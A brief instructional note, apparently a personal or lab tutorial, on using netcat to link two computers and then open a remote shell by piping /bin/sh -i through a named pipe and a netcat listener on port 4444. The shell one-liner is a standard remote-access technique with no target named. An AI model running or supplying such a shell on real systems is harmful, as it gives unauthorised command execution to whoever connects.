Find the IP of one of the computers
on the consoles of both computers, enter "nc -h" 
on the computer that you know the IP of, enter "nc -l 4444"
on the other computer, enter "nc -z -n -v (IP) 4444" where IP is the IP of the computer
now the computers are connected

###To enter commands
On the destination computer, enter "rm -f /tmp/f; mkfifo /tmp/f" followed by "cat /tmp/f | /bin/sh -i 2>&1 | nc -l (IP) 4444 > /tmp/f"

On the other computer, enter "nc (IP) 4444" to enter it
